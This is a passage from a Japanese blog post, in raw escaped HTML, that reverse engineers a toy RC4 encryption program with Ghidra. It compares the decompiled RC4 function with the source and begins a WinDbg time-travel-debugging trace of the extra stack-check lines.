    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; argc&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;RC4 module\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// RC4のkeyは短いと簡単に推測されてしまうため、実際に使用する場合は注意が必要&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;key &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;testkey&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;text &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;this is test.&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;encrypted_text &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;RC4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;key&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; text&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; encrypted_text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;This is encrypted text\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;==&gt; &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; len &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; len&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;%02hhX&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; encrypted_text&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;decrypted_text &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;encrypted_text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;RC4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;key&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; encrypted_text&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; decrypted_text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;This is decrypted text\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;==&gt; &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; len &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; len&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;%c&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; decrypted_text&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最後に、このプログラムをリバーシングしてみます。&lt;/p&gt;
&lt;h2 id=&quot;rc4プログラムをリバーシングしてみる&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#rc4%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%82%92%E3%83%AA%E3%83%90%E3%83%BC%E3%82%B7%E3%83%B3%E3%82%B0%E3%81%97%E3%81%A6%E3%81%BF%E3%82%8B&quot; aria-label=&quot;rc4プログラムをリバーシングしてみる permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;RC4プログラムをリバーシングしてみる&lt;/h2&gt;
&lt;p&gt;とりあえずビルドしたバイナリをGhidraで解析してみます。&lt;/p&gt;
&lt;p&gt;main関数の特定方法などは割愛します。&lt;/p&gt;
&lt;h3 id=&quot;呼び出し関数のデコンパイル&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%91%BC%E3%81%B3%E5%87%BA%E3%81%97%E9%96%A2%E6%95%B0%E3%81%AE%E3%83%87%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%AB&quot; aria-label=&quot;呼び出し関数のデコンパイル permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;呼び出し関数のデコンパイル&lt;/h3&gt;
&lt;p&gt;まずはRC4の呼び出し関数をチェックしてみます。&lt;/p&gt;
&lt;p&gt;ソースコードでいうと以下の部分です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;RC4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;key&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;encrypted_text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;N&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;KSA&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;key&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; S&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;PRGA&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;S&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; text&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; encrypted_text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;デコンパイル結果を見ると、何か変です笑&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; __cdecl &lt;span class=&quot;token function&quot;&gt;RC4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;param_1&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;param_2&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; param_3&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  uint uVar1&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  undefined extraout_DL&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  undefined in_stack_fffffef8&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  
  uVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; DAT_00471090 &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;stack0xfffffffc&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;thunk_FUN_004071b0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;stack0xfffffef8&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;thunk_FUN_00407260&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;stack0xfffffef8&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;param_2&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;param_3&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;thunk_FUN_00407648&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uVar1 &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;stack0xfffffffc&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;extraout_DL&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;in_stack_fffffef8&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;解析を容易にするため、関数名や変数名をリネームしました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; __cdecl &lt;span class=&quot;token function&quot;&gt;RC4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;key&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; encrypted_text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  uint uVar1&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  undefined extraout_DL&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  undefined S&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  
  uVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; DAT_00471090 &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;stack0xfffffffc&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;KSA&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;key&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;stack0xfffffef8&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;PRGA&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;stack0xfffffef8&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;encrypted_text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;thunk_FUN_00407648&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uVar1 &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;stack0xfffffffc&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;extraout_DL&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;S&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ソースコードにはない以下の2行が何をしているのかよくわからないですね。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;uVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; DAT_00471090 &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;stack0xfffffffc&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;/* 中略 */&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;thunk_FUN_00407648&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uVar1 &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;stack0xfffffffc&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;extraout_DL&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;S&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;というわけで、WinDbgのTTDトレースを使ってこの箇所を解析していきます。&lt;/p&gt;
&lt;h3 id=&quot;ttdトレースを解析する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ttd%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B9%E3%82%92%E8%A7%A3%E6%9E%90%E3%81%99%E3%82%8B&quot; aria-label=&quot;ttdトレースを解析する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;TTDトレースを解析する&lt;/h3&gt;
&lt;p&gt;例によってTTDトレースを取得しました。&lt;/p&gt;
&lt;p&gt;トレースファイルは以下に配置してあります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/kash1064/Try2WinDbg/blob/master/traces/rc4_encrypt.zip&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Try2WinDbg/rc4_encrypt.zip&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;このトレースファイルをロードし、&lt;code class=&quot;language-text&quot;&gt;uVar1 = DAT_00471090 ^ (uint)&amp;amp;stack0xfffffffc;&lt;/code&gt;の処理を行っているアドレスにブレークポイントを設定します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 659px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/e89668a93e15c3df0bca083fd4cb0504/6db71/image-3.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
